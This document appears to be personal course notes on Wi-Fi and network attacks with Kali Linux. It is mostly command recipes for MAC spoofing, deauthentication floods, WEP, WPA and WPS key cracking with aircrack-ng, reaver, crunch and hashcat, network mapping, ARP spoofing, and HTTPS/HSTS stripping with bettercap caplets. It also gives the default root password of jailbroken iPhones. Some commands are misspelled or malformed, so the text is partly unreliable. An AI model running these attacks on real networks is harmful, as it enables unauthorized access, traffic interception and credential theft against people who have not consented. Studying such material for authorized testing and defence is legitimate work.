**Basic Setup and LINUX BASIC COMMANDS:**
<pre>
install link for kalilinux - https://zsecurity.org/download-custom-kali/
unzip it
Go to vm ware, file -open -this unzipped file
check settings 
run 

pwd
ls    ls -l
cd   cd ..
man ls (or )man cd  ls --help -> helps in detail
tab -> auto complete
apt-get    -> donwload or install progs (or) apps
apt-get update
apt-get install app_name -y
<b>NEEDED APPS:</b>    (apt-get install terminator)
terminator  - spliting option in terminal
<b>WEBSITES:</b>
explainshell.com
</pre>

**PRE CONNECTION SETUP KNOWLEDGE**
<pre>
<b>wireless adapter with props:</b> 
* monitor mode
* packet injection
* AP mode
* Recommended brand: Atheros AR9271, Realtek RTL8812AU

before connecting network interface
     ifconfig
     eth0 and lo
after connecting to machine
     iwconfig
     eth0 lo and wlan0

<b>MAC</b>-media access control     (network device address )    which will be same in all computers
permanent, physical, unique    (assigned by manufacturer to network interafces like wifi, wifi card,wifi adapters,wired)
contains source mac and destination mac
change MAC address to become anonymous    
Uses: Bypass filter, anonymity

<b>Network Interfaces</b>
network interface – any device allowing us to connect to a network
inside eth0 or wlan0 or lo ether ____________  is mac address in managed mode, ether is not shown and unspec is shown in monitor mode(first 12 digits without in monitor mode
ifconfig -> show all interfaces
iwconfig → show all wireless network interfaces

<b>Change MAC address</b>
     ifconfig wlan0 down    (for disabling before the change process) 
     ifconfig wlan0 hw ether 00:11:22:33:44:55     (after restart get resetted)
     ifconfig wlan0 up 
device1 MAC accept data only If the device2 have its destination MAC as  device1   
default mode for network devices is managed mode   (captures packets only from destination mac address )
Eg:source mac address: 00:11:22:3
     destination mac address : 00:55:34:56
can do monitor using monitor mode    (captures packets from any destination address almost all)
     iwconfig wlan0 down 
     iwconfig wlan0 mode monitor 
     iwconfig wlan0 up 
attacks don't need any internet connection
</pre>


**PACKET SNIFFING**
<pre>
<b>aircrack-ng</b>
     airodump-ng mon0      → shows the packets
most of the wifi adapter only communicates with 2.5ghz frequency

ESSID      name
BSSID      mac_address
PwR    signal strength
#/s      data collected per second
CH     works on channel
MB    maximum speed
ENC   encryption mode
AUTH   authentication used
     airodump-ng  --band a mon0            shows 5G networks tooo
     airodump-ng  -- bssid  11:21:G6:14   - -channel  2  - - write  filename   mon0 
     ctr C     ( to stop)


<b>Deauthentication </b>
To pretend as client having its mac address
To pretend like router having its mac address and disconnecting all networks
**airplay-ng**
>airplay-ng  --deauth  100000000 -a target_router_mac_address  -c client_mac_address  mon0   (mac_address info is taken from airodump-ng)
>ctr  C    to stop
</pre>

**Wifi Hacking (WEP/WPA/WPA2)** 

<b>WEP CRACKING</b>
The client encrypts the data with a unique key and sends in air to the router
This router decrypts the data using same key.
Initial vector + passsword =  keystream
keystream + “this is the message”  →  cnu3dhubd   (encoded)
router always have the key but not Initial vector(IV)
IV is only 24bits so it repeats it again and again without creating unique key

Methods
airodump-ng   to capture all packets/IVs
aircrack-ng      to analyze the IVs and crack the key 
     airodump-ng  --bssid  target_mac  --channel  2  --write  filename   mon0    <
filename.cap is the file <br>
     aircrack-ng filename.cap 
prompts key found!  23:42:23:A2
put the password in wifi as 234223A2  done

<b>Fakeauth attack</b>
a for accknowledge must do before all attacks
     aireplay-ng - -fakeauth 0 -a target_mac -h my_mac

<b>Arp request reply attack</b>
if the router or wifi is not having more data passed, it can't be cracked,so need to inject more packages with aireplay 
     aireplay-ng - -fakeauth 0 -a target_mac -h my_mac        (ACK for telling we are connecting to the netw interface ) 
     airodump-ng  - - bssid  target_mac  - -channel  2  - - write  file_name  mon0 
     aireplay-ng  - -arpreplay -b target_mac -h my_mac mon0        check data value in info 
     aircrack-ng filename.cap 
or 

Korek ChopChop Attack   (refer somewhere) 
or
Fragmentation Attack (refer somewhere) 

<b>WPA AND WPA2 CRACKING</b>

wpa and wpa2 have the wps push button enabled or disable which is useful in cracking.
This wps feature can be found by
     wash  - - interface mon0
Lck   tells locked or not
it may fail if the target router has PBC(push button auth) or wps disabled

     reaver - -bssid  target_mac - -channel 1 - -interface mon0 -vvv - -no-associate 
paralleley add the down cmd 
     aireplay-ng - -fakeauth 0 -a target_mac -h my_mac 

when PBC(push button auth) or wps disabled, use the following method 
     airplay-ng  - -deauth  4 -a target_router_mac_address  -c client_mac_address  mon0   (use –deauth 4 so that client don't identify they are disconnected)
</pre>

**Create word list:**
<pre>
<b>crunch</b>
     crunch 6 8 abctd123$@ -o pass.txt
6 min combinations
8 max combinations
abctd123$@ combinations to use 

     aircrack-ng handshake.cap  -w pass.txt
done :)

<b>Pairwise Master Key</b> from word list (faster than previous)
     airolib-ng test-db  - -import password pass.txt
create a text file with essid 
     airolib-ng test-db  - -import essid essid.txt
     airolib-ng test-db –batch
- done :)

     aircrack-ng -r test-db handshake.cap  
done :)

<b>Hashcat</b> (use GPU - fastest cracking ) in windows      
download converted file of .cap to .hccapx and add it in hashcat dir
add pass.txt in hashcat dir
     hashcat64.exe -I          shows cpu and gpu info 
     hashcat64.exe -m 2500 -d 1 handshake.hcapx pass.txt 
m - wpa/wpa2 hash 
d -  which device to use
</pre>


<b>Network Mapping:</b>
<pre>
To find devices connected and their ip, mac etc
    netdiscover -r 10.0.1.1/24      (1/24 check for 1 to 254)
    q -  to quit.
Nmap/zenmap
zenmap
ping scan,quick scan,quick scan plus (slower)   - gives the os and version of the service
so that we can search the “service name + version” exploit  in the google

<b>NOTE:</b>when iphone is jail broken , it automatically creates service SSH and password : alpine
    ssh root@ipaddress 
    password:alpine
    
    
<b>MITM attack (Man in the middle attack):</b>
being in the middle of the connection ,intercepting and watching the tranferred data
communication between networks is carried out using mac address and not ip adr
Method1: Arp spoofing attack
</pre>



<b>ARP spoofing:</b>   
<pre>
ARP-Address Resolution Protocol  
In this process, the hacker machine does 2 things
* hacklap telling router this is the IP (pretending to have targlap's IP address)
----router registers this ip and mac address of hacklap
* hacklap telling the targlap this is the IP (pretending to have router's IP address) 
----targlap registers this ip and mac address of hacklap 
ARP spoofing is possible because the clients even accepts response without sending requests and trusts without verification

<b>TOOLS</b>
<b>1.arpspoof</b>
    arp -a      (show ip and mac in arp table)
    arpspoof -i eth0(or)wlan0 -t   target'sIP   router'sIP            (to targetlap)
    arpspoof -i eth0(or)wlan0 -t   router'sIP   target'sIP            (to router)
after this cmd exec, the mac address mapped to the router inside the targlap is changed as hacklap's mac address 
(use arp -a to check)
* Linux defaultly have port-forwarding disabled , must enable port-forwarding for to-from communication
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
<b>2.bettercap</b>
to go into 
    bettercap -iface  eth0(or)wlan0
    >help
    >help net.probe
    >net.probe on    (finds all ip's and mac of all devices connected to eth0/wlan0)
    >net.show    (shows the ip mac table)
    >help arp.spoof       (shows all submodules and params)
    
    
    (attack example)
    >net.probe on
    >set arp.spoof.fullduplex true      (set submodule_name true ,for making any params to true or false)
    >set arp.spoof.targets targetlap'sIP
    >arp.spoof on
    >net.sniff on    (capture and analyze data)
 to stop and come out
    >exit
* bypassing https ,To spoof and snif https , we would convert the https to http and give to target.
When converting Https to Http, set net.sniff.local true    (so that it doesn't feel insecure to show data on screen)
to see predefined caplets,
    >caplets.show
    >hstshijack/hstshijack
* bypassing hsts, some replacing scripts needed.
dns spoofing(redirecting the domain in the targetalp to our running apache server)
    service apache2 start  (run the local server)   and modify the \var\www\html\index.html as your wish
use dnf.spoof inside bettercap 
* setting hstshijack payload, go to \usr\local\share\bettercap\caplets\ in the set\hshstjack\payloads add , after the previous script and add like *:\filename.js    (* for all websites)
* to enter bettercap userinterface , 
    bettercap -iface  eth0(or)wlan0
    >http-ui          (if not installed >ui.update)
    username:user
    password:pass
* use Wireshark for future analysis of the file.cap
 </pre>   
  
  
<pre>
<b>NOTE:</b> use caplets for creating a script
    <b>CAPLET</b>(cmds as txt file )
    open text file and add the commands line by line
        net.probe on
        set arp.spoof.fullduplex true 
        set arp.spoof.targets 2.0.0.7
        arp.spoof on
        set net.sniff.local true
        set net.sniff.output /anylocation/file.cap       (to open in wireshark)
        net.sniff on  
     save in extension filename.cap in /root
    to run caplet in bettercap
        bettercap -iface eth0 -caplet /root/filename.cap


    <b>Http</b> data in http is plain text, Man in the middle can read and edit request,response
    <b>Https</b> data is encrypted using TLS(transport layer security) or SSL (secure sockets layers)

   
   </pre>
    

